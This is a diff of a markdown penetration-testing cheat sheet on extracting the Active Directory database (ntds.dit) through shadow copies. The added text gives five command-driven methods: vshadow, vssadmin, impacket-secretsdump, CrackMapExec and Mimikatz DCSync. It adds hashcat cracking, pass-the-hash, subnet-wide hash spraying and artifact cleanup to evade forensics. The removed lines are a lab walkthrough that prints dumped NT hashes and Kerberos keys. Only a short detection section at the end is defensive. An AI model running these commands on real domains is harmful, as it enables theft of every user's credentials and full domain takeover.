@@ -1,112 +1,212 @@
-### 23.2.2
+# Shadow Copies — NTDS.dit Extraction
 
-To manage volume shadow copies, the Microsoft signed binary vshadow.exe is offered as part of the Windows SDK.
+Volume Shadow Copy Service (VSS) is a Windows feature that creates point-in-time snapshots of volumes while they are in use. From an attacker's perspective, shadow copies are valuable because they allow access to files that are normally locked by the OS — most importantly `ntds.dit`, the Active Directory database that contains every domain user's password hash.
 
-As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.
+> Requires local administrator or Domain Admin privileges on the Domain Controller.
 
-To start, we'll connect as the jeffadmin domain admin user to the DC1 domain controller. Here we will launch an elevated command prompt and run the vshadow utility with -nw options to disable writers, which speeds up backup creation and include the -p option to store the copy on disk.
+---
+
+## Why NTDS.dit
+
+The file `C:\Windows\NTDS\ntds.dit` is the Active Directory database. It stores:
+
+- NTLM hashes for every domain user
+- Kerberos keys
+- Password history
+- Group membership
+
+The OS keeps it locked at all times — shadow copies bypass this lock entirely.
+
+---
+
+## Method 1 — vshadow.exe (Manual)
+
+### Step 1 — Create a Shadow Copy of the C Drive
+
+```cmd
+vshadow.exe -nw -p C:
+```
+
+Note the shadow copy device path from the output — it looks like:
+`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`
+
+### Step 2 — Copy NTDS.dit from the Shadow Copy
+
+```cmd
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
+```
+
+### Step 3 — Save the SYSTEM Hive
+
+The SYSTEM registry hive contains the boot key needed to decrypt NTDS.dit.
+
+```cmd
+reg.exe save hklm\system C:\system.bak
+```
+
+### Step 4 — Transfer Files to Kali
+
+Use any method from your file transfer notes. Quick options:
+
+```bash
+# From Kali — pull via SMB if you have creds
+smbclient //<target_ip>/C$ -U "<domain>\<username>" -c "get ntds.dit.bak; get system.bak"
+
+# Or set up a Python HTTP server on the victim and wget from Kali
+# Victim (PowerShell):
+python3 -m http.server 8080
+
+# Kali:
+wget http://<victim_ip>:8080/ntds.dit.bak
+wget http://<victim_ip>:8080/system.bak
+```
+
+### Step 5 — Extract Hashes on Kali
+
+```bash
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
+
+---
+
+## Method 2 — impacket-secretsdump (Remote, No File Transfer)
+
+If you have Domain Admin credentials, skip the manual steps entirely and dump remotely:
+
+```bash
+# With cleartext credentials
+impacket-secretsdump <domain>/<username>:<password>@<dc_ip>
+
+# Pass-the-Hash
+impacket-secretsdump -hashes <LM>:<NT> <domain>/<username>@<dc_ip>
+
+# Extract only a specific user's hash
+impacket-secretsdump -just-dc-user <target_username> <domain>/<username>:<password>@<dc_ip>
+
+# Save output to file
+impacket-secretsdump <domain>/<username>:<password>@<dc_ip> -outputfile hashes
+```
+
+---
+
+## Method 3 — vssadmin (Built-in Windows)
+
+No external tools needed — vssadmin is available on all Windows Server versions.
+
+```cmd
+# List existing shadow copies
+vssadmin list shadows
+
+# Create a new shadow copy
+vssadmin create shadow /for=C:
+
+# Access the shadow copy — replace X with the shadow copy number
+mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
+
+# Copy NTDS.dit from the mounted shadow copy
+copy C:\ShadowCopy\Windows\NTDS\ntds.dit C:\ntds.dit.bak
+
+# Save SYSTEM hive
+reg save hklm\system C:\system.bak
+
+# Clean up the symlink after use
+rmdir C:\ShadowCopy
+```
+
+---
+
+## Method 4 — CrackMapExec (One-liner)
+
+```bash
+# Dump NTDS.dit directly via CME — handles shadow copy creation internally
+crackmapexec smb <dc_ip> -u <username> -p <password> --ntds
+
+# Pass-the-Hash
+crackmapexec smb <dc_ip> -u <username> -H <NT_hash> --ntds
+
+# VSS method explicitly
+crackmapexec smb <dc_ip> -u <username> -p <password> --ntds vss
+```
+
+---
+
+## Method 5 — Mimikatz (If You Can't Transfer Files)
+
+When you can't exfiltrate files to Kali, use Mimikatz directly on the DC:
+
+```powershell
+mimikatz # lsadump::ntds /ntds:"C:\ntds.dit.bak" /system:"C:\system.bak"
+
+# Or dump directly from the running DC without shadow copies (noisier)
+mimikatz # lsadump::dcsync /domain:<domain> /all /csv
+```
+
+---
+
+## Working With the Extracted Hashes
+
+### Output Format
+
+`impacket-secretsdump` returns hashes in this format:
 
 ```
-C:\Tools>vshadow.exe -nw -p  C:
-
-VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
-Copyright (C) 2005 Microsoft Corporation. All rights reserved.
-
-
-(Option: No-writers option detected)
-(Option: Create shadow copy set)
-- Setting the VSS context to: 0x00000010
-Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
-- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
-Creating the shadow (DoSnapshotSet) ...
-(Waiting for the asynchronous operation to finish...)
-Shadow copy set succesfully created.
-
-List of created shadow copies:
-
-
-Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
-
-* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
-   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
-   - Original count of shadow copies = 1
-   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
-   - Creation Time: 9/19/2022 4:31:51 AM
-   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
-   - Originating machine: DC1.corp.com
-   - Service machine: DC1.corp.com
-   - Not Exposed
-   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
-   - Attributes:  Auto_Release No_Writers Differential
-
-
-Snapshot creation done.
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<username>:<RID>:<LM_hash>:<NT_hash>:::
 ```
-    Listing 41 - Performing a Shadow Copy of the entire C: drive
 
-Once the snapshot has been taken successfully, we should take note of the shadow copy device name.
-We'll now copy the whole AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy device name and adding the full ntds.dit path.
+The NT hash (last field before `:::`) is what you need.
 
+### Crack with Hashcat
+
+```bash
+# Extract just the NT hashes
+cut -d: -f4 hashes.ntds > nt_hashes.txt
+
+# Crack with hashcat (mode 1000 = NTLM)
+hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# With rules for better coverage
+hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
-   1 file(s) copied.
+
+### Pass-the-Hash with Extracted Hashes
+
+```bash
+# No cracking needed — use the NT hash directly
+crackmapexec smb <target> -u Administrator -H <NT_hash>
+
+# Evil-WinRM
+evil-winrm -i <target_ip> -u Administrator -H <NT_hash>
+
+# Impacket psexec
+impacket-psexec <domain>/Administrator@<target_ip> -hashes :<NT_hash>
 ```
-    Listing 42 - Copying the ntds database to the C: drive
 
-As a last ingredient, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the reg utility and the save argument.
+### Check for Reused Passwords Across Hosts
 
+```bash
+# Spray the extracted NT hashes across the network
+crackmapexec smb <subnet>/24 -u Administrator -H <NT_hash> --local-auth
 ```
-C:\>reg.exe save hklm\system c:\system.bak
-The operation completed successfully.
+
+---
+
+## Cleanup
+
+Remove artifacts from the DC to reduce forensic footprint:
+
+```cmd
+del C:\ntds.dit.bak
+del C:\system.bak
+vssadmin delete shadows /shadow:<shadow_id> /quiet
 ```
-    Listing 43 - Copying the ntds database to the C: drive
 
-Once the two .bak files are moved to our Kali machine, we can continue extracting the credential materials with the secretsdump tool from the impacket suite. We'll supply the ntds database with the -ntds parameter and the system hive with the -system parameter. Then we will tell impact to parse the files locally by adding the LOCAL keyword.
+---
 
-```
-kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+## Detection Notes
 
-[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Searching for pekList, be patient
-[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
-[*] Reading and decrypting hashes from ntds.dit.bak
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
-dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
-stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
-jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
-jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
-iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
-WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
-FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
-CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
-CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
-pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
-jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
-CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
-[*] Kerberos keys from ntds.dit.bak
-Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
-Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
-Administrator:des-cbc-md5:fd79dc380ee989a4
-DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
-DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
-DC1$:des-cbc-md5:f7f804ce43264a43
-krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
-krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
-krbtgt:des-cbc-md5:683bdcba9e7c5de9
-...
-[*] Cleaning up...
-```
-    Listing 44 - Copying the ntds database to the C: drive
-
-Great! We managed to obtain NTLM hashes and Kerberos keys for every AD user. We can now try to crack them or use as-is in pass-the-hash attacks.
-
-While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.
-
-To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.
-
-Although most penetration tests wouldn't require us to be covert, we should always evaluate a given technique's stealthiness, which could be useful during future red-teaming engagements.
+- Event ID 7036 — VSS service started (unusual if not during backup window)
+- Event ID 8222 — Shadow copy created outside scheduled backup
+- Event ID 4656 / 4663 — NTDS.dit file access
+- LSASS access and `reg save` commands are high-confidence indicators
+- Monitor for `ntds.dit` copies outside `C:\Windows\NTDS\`
